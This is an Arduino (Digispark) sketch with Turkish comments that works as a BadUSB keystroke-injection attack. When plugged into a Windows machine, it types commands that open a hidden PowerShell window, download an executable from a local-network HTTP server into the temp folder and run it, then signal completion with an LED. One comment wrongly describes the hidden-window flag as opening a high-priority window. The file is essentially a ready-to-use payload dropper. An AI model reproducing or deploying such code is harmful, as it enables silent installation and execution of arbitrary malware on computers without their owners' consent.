#define kbd_tr_tr
//  Klavye düzenini Türkçe (Q klavye) olarak ayarlar. Kodun geri kalanında bu klavye düzeni kullanılacaktır.

#include "DigiKeyboard.h"
// Dijital klavye işlevlerini kullanmak için "DigiKeyboard" kütüphanesini içerir.

void setup() {
  pinMode(1, OUTPUT);
  // Arduino'nun 1 numaralı pinini çıkış olarak ayarlar. Bu pin, sonraki satırlarda kullanılarak bir işlem tamamlandığında bir LED'in yanmasını kontrol eder.

  DigiKeyboard.delay(4000);
  // 4 saniye boyunca bir gecikme ekler. İşlemler arasında bekleme süreleri sağlar.

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Windows işletim sisteminde "Windows tuşuna basın + R" kombinasyonunu simgeler. Bu, Çalıştır penceresini açmak için kullanılır.

  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell -Win H");
  // "powershell -Win H" komutunu yazmaya başlar. Bu, yüksek öncelikli bir PowerShell penceresi açar.

  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //  Enter tuşuna basmayı simgeler ve komutu yürütür.

  DigiKeyboard.delay(300); 
  DigiKeyboard.print("(New-Object System.Net.WebClient).DownloadFile(\"http://192.168.1.95:8000/0123456789.exe\", \"$env:temp/0123456789.exe\")");
  // PowerShell komut satırına bir dosyanın indirilmesini sağlayan bir komutu yazmaya başlar. Dosya, "http://192.168.1.95:8000/0123456789.exe" adresinden indirilir ve "$env:temp" dizinine "0123456789.exe" olarak kaydedilir.

  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100); 
  DigiKeyboard.print("cd $env:temp");
  //  PowerShell komut satırında "$env:temp" dizinine gidilmesini sağlar.

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("./0123456789.exe");
  // "0123456789.exe" adlı bir programı çalıştırmak için yazmaya başlar.

  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  // Arduino'nun 1 numaralı pinini yüksek (HIGH) duruma getirerek bir LED'i yakar. Bu, işlemin tamamlandığını göstermek için kullanılır.
}

void loop() {
  
}